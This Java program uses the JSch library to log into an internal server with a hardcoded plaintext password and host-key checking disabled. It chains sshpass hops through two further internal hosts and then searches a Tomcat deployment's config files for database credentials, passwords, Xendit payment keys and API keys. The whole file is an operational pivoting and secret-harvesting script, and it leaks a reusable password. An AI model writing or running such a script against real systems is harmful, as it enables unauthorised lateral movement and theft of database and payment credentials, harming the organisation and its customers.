import com.jcraft.jsch.*;
import java.io.*;
class DKNEO7 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"find /progs/neo/ -name \\\"application*.properties\\\" -o -name \\\"hibernate*.properties\\\" -o -name \\\"database*.properties\\\" -o -name \\\"context.xml\\\" 2>/dev/null | head -10;echo ---CONTEXT-XML---;cat /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/META-INF/context.xml 2>/dev/null;cat /progs/neo/neo-app/tomcat/8.0.53/conf/context.xml 2>/dev/null;echo ---WEBAPP-CLASSES-PROPS---;find /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/ -name \\\"*.properties\\\" 2>/dev/null | head -10;cat /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/application.properties 2>/dev/null | grep -iE \\\"db\\\\.\\\\|pass\\\\|xendit\\\\|xnd_\\\\|api.key\\\" | head -10\" 2>&1' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
